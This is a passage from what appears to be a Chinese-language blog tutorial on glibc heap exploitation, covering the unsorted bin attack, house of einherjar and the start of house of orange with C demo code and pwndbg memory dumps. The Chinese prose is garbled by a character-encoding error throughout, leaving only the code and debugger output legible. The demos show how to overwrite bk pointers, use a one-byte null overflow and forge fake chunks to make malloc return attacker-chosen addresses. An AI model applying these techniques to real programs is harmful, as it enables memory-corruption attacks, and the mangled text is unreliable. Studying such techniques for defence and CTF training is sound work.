ä¸­ã€‚å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ fake chunk çš„ fd æŒ‡é’ˆè¢«ä¿®æ”¹äº†ï¼Œè¿™æ˜¯ unsorted bin çš„åœ°å€ï¼Œé€šè¿‡å®ƒå¯ä»¥æ³„éœ² libc åœ°å€ï¼Œè¿™æ­£æ˜¯ä¸‹é¢ unsorted bin attack ä¼šè®²åˆ°çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="number">30</span>   <span class="keyword">intptr_t</span>* fake = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">// malloc a new chunk from fake chunk.</span></span><br><span class="line"><span class="number">31</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x100): %p\n&quot;</span>, fake);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx fake-2</span><br><span class="line">0x7fffffffe3f0:0x00000000000000000x0000000000000110   &lt;-- chunk</span><br><span class="line">0x7fffffffe400:0x00007ffff7dd1b580x00007fffffffe3f0     &lt;---fd ,bk //new fd ---&gt; 0x7ffff7dd1b58</span><br><span class="line">0x7fffffffe410:0x00007fffffffe5000x29b3145efbaf1600</span><br><span class="line">0x7fffffffe420:0x00000000004008600x00007ffff7a303f1</span><br><span class="line">0x7fffffffe430:0x00000000000400000x00007fffffffe508</span><br><span class="line">0x7fffffffe440:0x00000001f7b9a4880x0000000000400686</span><br><span class="line">0x7fffffffe450:0x00000000000000000x595c9e280b1d3a76</span><br><span class="line">0x7fffffffe460:0x00000000004005900x00007fffffffe500</span><br><span class="line">0x7fffffffe470:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe480:0xa6a36157d3bd3a760xa6a371ee1c8f3a76</span><br></pre></td></tr></table></figure><h3 id="0x13-unsorted-bin-attack"><a href="#0x13-unsorted-bin-attack" class="headerlink" title="0x13 unsorted_bin_attack"></a>0x13 unsorted_bin_attack</h3><p>unsorted bin æ”»å‡»é€šå¸¸æ˜¯ä¸ºæ›´è¿›ä¸€æ­¥çš„æ”»å‡»åšå‡†å¤‡çš„ï¼Œæˆ‘ä»¬çŸ¥é“ unsorted bin æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œåœ¨åˆ†é…æ—¶ä¼šé€šè¿‡ unlink æ“ä½œå°† chunk ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œæ‰€ä»¥å¦‚æœèƒ½å¤Ÿæ§åˆ¶ unsorted bin chunk çš„ bk æŒ‡é’ˆï¼Œå°±å¯ä»¥å‘ä»»æ„ä½ç½®å†™å…¥ä¸€ä¸ªæŒ‡é’ˆã€‚è¿™é‡Œé€šè¿‡ unlink å°† libc çš„ä¿¡æ¯å†™å…¥åˆ°æˆ‘ä»¬å¯æ§çš„å†…å­˜ä¸­ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯æ³„æ¼ï¼Œä¸ºè¿›ä¸€æ­¥çš„æ”»å‡»æä¾›ä¾¿åˆ©ã€‚</p><p>unlink çš„å¯¹ unsorted bin çš„æ“ä½œæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œåˆ†é… ä¸¤ä¸ª chunkï¼Œé‡Šæ”¾ç¬¬ä¸€ä¸ª ä½¿å…¶åŠ å…¥åˆ° unstorted bin</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) â€”â–¸ 0x602000 â—‚â€” 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ï¼Œæˆ‘å‡è®¾æˆ‘ä»¬æœ‰å †æº¢å‡ºæ¼æ´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span> p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="number">27</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>å»ä¿®æ”¹ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä¿®æ”¹ chunk 1 çš„æ•°æ®ã€‚ç„¶åæˆ‘ä»¬å°† chunk 1 çš„ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å‘ç›®æ ‡åœ°å€ - 2ï¼Œä¹Ÿå°±ç›¸å½“äºæ˜¯åœ¨ç›®æ ‡åœ°å€å¤„æœ‰ä¸€ä¸ª fake free chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p</span><br><span class="line"><span class="variable">$1</span> = (unsigned long *) 0x602010</span><br><span class="line">PwnLife&gt; x/20gx p</span><br><span class="line">0x602010:0x00007ffff7dd1b580x00007ffff7dd1b58</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx p[1]</span><br><span class="line">0x7ffff7dd1b58 &lt;main_arena+88&gt;:0x00000000006023a00x0000000000000000</span><br><span class="line">0x7ffff7dd1b68 &lt;main_arena+104&gt;:0x00000000006020000x0000000000602000</span><br><span class="line">0x7ffff7dd1b78 &lt;main_arena+120&gt;:0x00007ffff7dd1b680x00007ffff7dd1b68</span><br><span class="line">0x7ffff7dd1b88 &lt;main_arena+136&gt;:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b98 &lt;main_arena+152&gt;:0x00007ffff7dd1b880x00007ffff7dd1b88</span><br><span class="line">0x7ffff7dd1ba8 &lt;main_arena+168&gt;:0x00007ffff7dd1b980x00007ffff7dd1b98</span><br><span class="line">0x7ffff7dd1bb8 &lt;main_arena+184&gt;:0x00007ffff7dd1ba80x00007ffff7dd1ba8</span><br><span class="line">0x7ffff7dd1bc8 &lt;main_arena+200&gt;:0x00007ffff7dd1bb80x00007ffff7dd1bb8</span><br><span class="line">0x7ffff7dd1bd8 &lt;main_arena+216&gt;:0x00007ffff7dd1bc80x00007ffff7dd1bc8</span><br><span class="line">0x7ffff7dd1be8 &lt;main_arena+232&gt;:0x00007ffff7dd1bd80x00007ffff7dd1bd8</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œchunk 1çš„ bkå·²ç»è¢«ä¿®æ”¹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 417,</span><br><span class="line">  fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7fffffffe3c8,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ malloc ä¸€å—æ–° chunkï¼Œè¿™ä¸ªæ—¶å€™ï¼Œç³»ç»Ÿä¸ºå¾ªç€ bkå» mallocä¸€å—æ–°chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx &amp;stack_var-2</span><br><span class="line">0x7fffffffe3c8:0x000000000040081a0x0000000000400880           &lt;--- fake chunk</span><br><span class="line">0x7fffffffe3d8:0x00007ffff7dd1b580x0000000000602010 &lt;--- fd</span><br><span class="line">0x7fffffffe3e8:0x3cc687447353a2000x0000000000400880</span><br><span class="line">0x7fffffffe3f8:0x00007ffff7a303f10x0000000000040000</span><br><span class="line">0x7fffffffe408:0x00007fffffffe4d80x00000001f7b9a488</span><br><span class="line">0x7fffffffe418:0x00000000004006860x0000000000000000</span><br><span class="line">0x7fffffffe428:0x577f97b5f5d4f6ba0x0000000000400590</span><br><span class="line">0x7fffffffe438:0x00007fffffffe4d00x0000000000000000</span><br><span class="line">0x7fffffffe448:0x00000000000000000xa88068ca2cd4f6ba</span><br><span class="line">0x7fffffffe458:0xa8807873e386f6ba0x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="0x14-house-of-einherjar"><a href="#0x14-house-of-einherjar" class="headerlink" title="0x14 house_of_einherjar"></a>0x14 house_of_einherjar</h3><p>house of einherjar æ˜¯ä¸€ç§å †åˆ©ç”¨æŠ€æœ¯ï¼Œç”± <code>Hiroki Matsukuma</code> æå‡ºã€‚è¯¥å †åˆ©ç”¨æŠ€æœ¯å¯ä»¥å¼ºåˆ¶ä½¿å¾— <code>malloc</code> è¿”å›ä¸€ä¸ªå‡ ä¹ä»»æ„åœ°å€çš„ chunk ã€‚</p><p>å®ƒè¦æ±‚æœ‰ä¸€ä¸ªå•å­—èŠ‚æº¢å‡ºæ¼æ´ï¼Œè¦†ç›–æ‰ next chunk çš„ size å­—æ®µå¹¶æ¸…é™¤ <code>PREV_IN_USE</code> æ ‡å¿—ï¼Œç„¶åè¿˜éœ€è¦è¦†ç›– prev_size å­—æ®µä¸º fake chunk çš„å¤§å°ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆ malloc ä¸€ä¸ªchunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘ä»¬fakeä¸€ä¸ªchunk ï¼Œç”¨æ¥ä¹‹å  free æ‰ next  chunkçš„æ—¶å€™ï¼Œè®©åˆå¹¶åçš„å †å—åˆ° fake chunk å¤„ï¼Œé‚£ä¸‹ä¸€æ¬¡ malloc å°†è¿”å›æˆ‘ä»¬æƒ³è¦çš„åœ°å€ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_chunk</span><br><span class="line"><span class="variable">$1</span> = &#123;256, 256, 140737488348080, 140737488348080, 140737488348080, 140737488348080&#125;</span><br><span class="line">pwndbg&gt; x/20gx &amp;fake_chunk</span><br><span class="line">0x7fffffffe3b0:0x00000000000001000x0000000000000100</span><br><span class="line">0x7fffffffe3c0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3d0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3e0:0x00007fffffffe4d00x3c402f70cff21400</span><br><span class="line">0x7fffffffe3f0:0x0000000000400bf00x00007ffff7a303f1</span><br><span class="line">0x7fffffffe400:0x00000000000400000x00007fffffffe4d8</span><br><span class="line">0x7fffffffe410:0x00000001f7b9a4880x00000000004006d6</span><br><span class="line">0x7fffffffe420:0x00000000000000000x86f4a78e4a5b6ea9</span><br><span class="line">0x7fffffffe430:0x00000000004005e00x00007fffffffe4d0</span><br><span class="line">0x7fffffffe440:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œåœ¨ malloc ä¸€ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬å‡è®¾æœ‰ä¸ª å †æº¢å‡ºæ¼æ´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">66</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="number">67</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="number">68</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line"><span class="number">69</span> a[real_a_size] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ‰ chunk b çš„size </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603040</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>,</span><br><span class="line">  size = <span class="number">256</span>,  <span class="comment">// 257 --&gt; 256</span></span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿˜å¾—è®© prev_size å­—æ®µä¸º fake chunk çš„å¤§å°</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_chunk</span><br><span class="line"><span class="variable">$8</span> = &#123;256, 18446603336227507344, 140737488348080, 140737488348080, 140737488348080, 140737488348080&#125;</span><br></pre></td></tr></table></figure><p>chunk bçš„ prev_size å­—æ®µï¼Œç”¨ chunk b çš„èµ·å§‹åœ°å€å‡å» fake chunk çš„èµ·å§‹åœ°å€ï¼ŒåŒæ—¶ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œè¿˜éœ€è¦å°† fake chunk çš„ size å­—æ®µä¸ chunk b çš„ prev_size å­—æ®µç›¸åŒ¹é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br></pre></td></tr></table></figure><p>chunk b</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x603040 &#123;</span><br><span class="line">  prev_size = 18446603336227507344,  // 0 -&gt; 18446603336227507344</span><br><span class="line">  size = 256,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ free æ‰ chunk b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">88</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="number">89</span>     <span class="built_in">free</span>(b);</span><br><span class="line"><span class="number">90</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘ä»¬ä¼šå‘ç° top chunk å˜äº†,top chunk -&gt; fake_chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p main_arena</span><br><span class="line"><span class="variable">$9</span> = &#123;</span><br><span class="line">  mutex = 0,</span><br><span class="line">  flags = 1,</span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">  top = 0x7fffffffe3b0,</span><br><span class="line">  last_remainder = 0x0,</span><br><span class="line">  bins = &#123;0x7ffff7dd1b58 &lt;main_arena+88&gt;, 0x7ffff7dd1b58 &lt;main_arena+88&gt;, 0x7ffff7dd1b68 &lt;main_arena+104&gt;, 0x7ffff7dd1b68 &lt;main_arena+104&gt;, 0x7ffff7dd1b78 &lt;main_arena+120&gt;, 0x7ffff7dd1b78 &lt;main_arena+120&gt;, 0x7ffff7dd1b88 &lt;main_arena+136&gt;, 0x7ffff7dd1b88 &lt;main_arena+136&gt;, 0x7ffff7dd1b98 &lt;main_arena+152&gt;, 0x7ffff7dd1b98 &lt;main_arena+152&gt;, 0x7ffff7dd1ba8 &lt;main_arena+168&gt;, 0x7ffff7dd1ba8 &lt;main_arena+168&gt;, 0x7ffff7dd1bb8 &lt;main_arena+184&gt;, 0x7ffff7dd1bb8 &lt;main_arena+184&gt;, 0x7ffff7dd1bc8 &lt;main_arena+200&gt;...&#125;,</span><br><span class="line">  binmap = &#123;0, 0, 0, 0&#125;,</span><br><span class="line">  next = 0x7ffff7dd1b00 &lt;main_arena&gt;,</span><br><span class="line">  next_free = 0x0,</span><br><span class="line">  attached_threads = 1,</span><br><span class="line">  system_mem = 135168,</span><br><span class="line">  max_system_mem = 135168</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p &amp;fake_chunk</span><br><span class="line"><span class="variable">$10</span> = (size_t (*)[6]) 0x7fffffffe3b0</span><br></pre></td></tr></table></figure><p>ç”±äºï¼Œæˆ‘ä»¬é‡Šæ”¾ chunk bï¼Œè¿™æ—¶å› ä¸º <code>PREV_INUSE</code> ä¸ºé›¶ï¼Œunlink ä¼šæ ¹æ® prev_size å»å¯»æ‰¾ä¸Šä¸€ä¸ª free chunkï¼Œå¹¶å°†å®ƒå’Œå½“å‰ chunk åˆå¹¶ã€‚</p><p>è¿™æ„å‘³ç€ï¼Œå½“æˆ‘ä»¬ å†å» malloc ä¸€å— æ–°chunkçš„æ—¶å€™ï¼Œå°†ä¼šæ˜¯ fake chunk çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">103</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line"><span class="number">104</span>     d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx fake_chunk</span><br><span class="line">0x7fffffffe3b0:0x00000000000001000x0000000000000211</span><br><span class="line">0x7fffffffe3c0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3d0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3e0:0x00007fffffffe4d00xc6f3cea232483100</span><br><span class="line">0x7fffffffe3f0:0x0000000000400bf00x00007ffff7a303f1</span><br><span class="line">0x7fffffffe400:0x00000000000400000x00007fffffffe4d8</span><br><span class="line">0x7fffffffe410:0x00000001f7b9a4880x00000000004006d6</span><br><span class="line">0x7fffffffe420:0x00000000000000000x0575c70b1ba71a36</span><br><span class="line">0x7fffffffe430:0x00000000004005e00x00007fffffffe4d0</span><br><span class="line">0x7fffffffe440:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; p d</span><br><span class="line"><span class="variable">$14</span> = (uint8_t *) 0x7fffffffe3c0 <span class="string">&quot;\260\343\377\377\377\177&quot;</span></span><br></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œç»•è¿‡ unlink æ£€æŸ¥çš„æ—¶å€™ï¼Œç›´æ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p</span><br><span class="line">p-&gt;bk = p</span><br></pre></td></tr></table></figure><h3 id="0x15-house-of-orange"><a href="#0x15-house-of-orange" class="headerlink" title="0x15 house of orange"></a>0x15 house of orange</h3><p>House of Orangeçš„æ ¸å¿ƒåœ¨äºåœ¨æ²¡æœ‰freeå‡½æ•°çš„æƒ…å†µä¸‹å¾—åˆ°ä¸€ä¸ªé‡Šæ”¾çš„å †å—(unsorted bin)ã€‚ è¿™ç§æ“ä½œçš„åŸç†ç®€å•æ¥è¯´æ˜¯å½“å‰å †çš„top chunkå°ºå¯¸ä¸è¶³ä»¥æ»¡è¶³ç”³è¯·åˆ†é…çš„å¤§å°çš„æ—¶å€™ï¼ŒåŸæ¥çš„top chunkä¼šè¢«é‡Šæ”¾å¹¶è¢«ç½®å…¥unsorted binä¸­ï¼Œé€šè¿‡è¿™ä¸€ç‚¹å¯ä»¥åœ¨æ²¡æœ‰freeå‡½æ•°æƒ…å†µä¸‹è·å–åˆ°unsorted binsã€‚</p><p>æˆ‘ä»¬çŸ¥é“ä¸€å¼€å§‹çš„æ—¶å€™ï¼Œæ•´ä¸ªå †éƒ½å±äº top chunkï¼Œæ¯æ¬¡ç”³è¯·å†…å­˜æ—¶ï¼Œå°±ä» top chunk ä¸­åˆ’å‡ºè¯·æ±‚å¤§å°çš„å †å—è¿”å›ç»™ç”¨æˆ·ï¼Œäºæ˜¯ top chunk å°±è¶Šæ¥è¶Šå°ã€‚å½“æŸä¸€æ¬¡ top chunk çš„å‰©ä½™å¤§å°å·²ç»ä¸èƒ½å¤Ÿæ»¡è¶³è¯·æ±‚æ—¶ï¼Œå°±ä¼šè°ƒç”¨å‡½æ•° <code>sysmalloc()</code> åˆ†é…æ–°å†…å­˜ï¼Œè¿™æ—¶å¯èƒ½ä¼šå‘ç”Ÿä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯ç›´æ¥æ‰©å…… top chunkï¼Œå¦ä¸€ç§æ˜¯è°ƒç”¨ mmap åˆ†é…ä¸€å—æ–°çš„ top chunkã€‚å…·ä½“è°ƒç”¨å“ªä¸€ç§æ–¹æ³•æ˜¯ç”±ç”³è¯·å¤§å°å†³å®šçš„ï¼Œä¸ºäº†èƒ½å¤Ÿä½¿ç”¨å‰ä¸€ç§æ‰©å±• top chunkï¼Œéœ€è¦è¯·æ±‚å°äºé˜€å€¼ <code>mp_.mmap_threshold</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(nb) &gt;&#x3D; (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰€éœ€åˆ†é…çš„ chunk å¤§å°å¤§äº mmap åˆ†é…é˜ˆå€¼ï¼Œé»˜è®¤ä¸º 128Kï¼Œå¹¶ä¸”å½“å‰è¿›ç¨‹ä½¿ç”¨ mmap()åˆ†é…çš„å†…å­˜å—å°äºè®¾å®šçš„æœ€å¤§å€¼ï¼Œå°†ä½¿ç”¨ mmap()ç³»ç»Ÿè°ƒç”¨ç›´æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿè°ƒç”¨ <code>sysmalloc()</code> ä¸­çš„ <code>_int_free()</code>ï¼Œéœ€è¦ top chunk å¤§äº <code>MINSIZE</code>ï¼Œå³ 0x10</p><p>å½“ç„¶ï¼Œè¿˜å¾—ç»•è¿‡ä¸‹é¢ä¸¤ä¸ªé™åˆ¶æ¡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request 